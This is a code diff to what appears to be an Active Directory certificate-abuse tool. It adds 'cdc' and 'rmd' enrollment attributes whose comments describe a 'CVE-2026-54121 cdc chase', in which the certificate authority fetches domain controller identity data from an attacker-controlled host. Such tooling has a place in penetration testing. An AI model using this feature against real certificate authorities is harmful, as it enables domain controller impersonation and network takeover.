@@ -1283,6 +1283,9 @@ class Request:
         http_port: Optional[int] = None,
         no_channel_binding: bool = False,
         dynamic_endpoint: bool = False,
+        cdc: Optional[str] = None,
+        rmd: Optional[str] = None,
+        request_attribute: Optional[List[str]] = None,
         **kwargs,  # type: ignore
     ):
         """
@@ -1298,6 +1301,9 @@ class Request:
             subject: Certificate subject name
             application_policies: List of application policy OIDs
             smime: SMIME capability identifier
+            cdc: Client-DC (cdc) enrollment attribute host for the CVE-2026-54121 chase
+            rmd: Remote-domain (rmd) DC principal for the CVE-2026-54121 chase
+            request_attribute: Additional raw "key:value" request attributes
             retrieve: Request ID to retrieve
             on_behalf_of: Username to request on behalf of
             pfx: Path to PKCS#12/PFX file
@@ -1339,6 +1345,18 @@ class Request:
             for policy in (application_policies or [])
         ]
         self.smime = smime
+
+        # Extra enrollment request attributes. cdc/rmd drive the CVE-2026-54121
+        # "cdc chase": the CA is told to fetch DC identity data from an
+        # attacker-controlled host (cdc) for the named DC principal (rmd).
+        request_attributes: List[str] = []
+        if cdc:
+            request_attributes.append(f"cdc:{cdc}")
+        if rmd:
+            request_attributes.append(f"rmd:{rmd}")
+        if request_attribute:
+            request_attributes.extend(request_attribute)
+        self.request_attributes = request_attributes
 
         # Connection parameters
         self.web = web
@@ -1525,6 +1543,7 @@ class Request:
             self.alt_upn,
             self.alt_sid,
             self.application_policies,
+            request_attributes=self.request_attributes,
         )
 
         # Submit the certificate request
